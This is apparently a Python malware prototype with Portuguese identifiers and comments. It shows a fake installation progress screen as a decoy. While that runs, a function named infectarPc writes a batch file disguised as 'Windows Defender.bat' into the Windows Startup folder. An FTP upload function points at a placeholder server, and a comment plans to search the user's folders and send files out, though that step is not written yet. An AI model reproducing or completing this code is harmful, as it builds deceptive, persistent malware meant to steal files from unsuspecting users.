import time
import os
import threading
import ftplib


def msgInstalacao():
    print("Instalando..")

    time.sleep(2)

    for x in range(0, 101):
        os.system('cls')
        print(str(x) + "%")
        time.sleep(.500)

def criarBatInicializacao():
        # só funciona no Windows 10 ( Eu acho )
        with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
                
                arq.write("echo off")
                arq.write("\n")
                arq.write("cls")
                arq.write("\n")
                arq.write("echo oi sumida rsrs")
                arq.write("\n")
                arq.write("pause")
                arq.write("\n")
                arq.close()

def subirFtp():
        session = ftplib.FTP('server.address.com','USERNAME','PASSWORD')
        file = open('kitten.jpg','rb')                  # file to send
        session.storbinary('STOR kitten.jpg', file)     # send the file
        file.close()                                    # close file and FTP
        session.quit()

def navegarPastas():
        dir = os.path.dirname(os.path.realpath(__file__))

        # ******* Pensar a respeito *******

        # buscar por arquivos nas pastas do usuario
        # se encontrar, subir para ftp
        # subirFtp()
        

def infectarPc():
        criarBatInicializacao()
        navegarPastas()

t = threading.Thread(target=msgInstalacao)
t.start()

if t.isAlive():
    infectarPc()



